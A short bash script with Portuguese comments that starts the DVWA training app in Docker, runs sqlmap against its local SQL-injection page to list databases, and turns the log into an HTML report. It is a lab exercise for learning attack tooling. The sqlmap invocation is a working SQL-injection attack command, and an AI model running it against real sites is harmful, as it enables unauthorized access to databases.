#!/bin/bash

# Ativando o DVWA
echo "[*] Subindo o DVWA com Docker..."
docker-compose up -d
sleep 10

# Executando o ataque com SQLMap
echo "[*] Executando SQLMap na DVWA..."
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
--data="id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" \
--batch --dbs --output-dir=output

# Gerando relatório em HTML
echo "[*] Gerando relatório..."
if [ -f output/*.log ]; then
  mkdir -p relatorio
  cp output/* relatorio/
  echo "<h1>Relatório SQLMap</h1><pre>" > relatorio/sqlmap-report.html
  cat relatorio/*.log >> relatorio/sqlmap-report.html
  echo "</pre>" >> relatorio/sqlmap-report.html
  echo "[+] Relatório salvo em relatorio/sqlmap-report.html"
else
  echo "[!] Nenhum log encontrado. Verifique se o ataque foi bem-sucedido."
fi

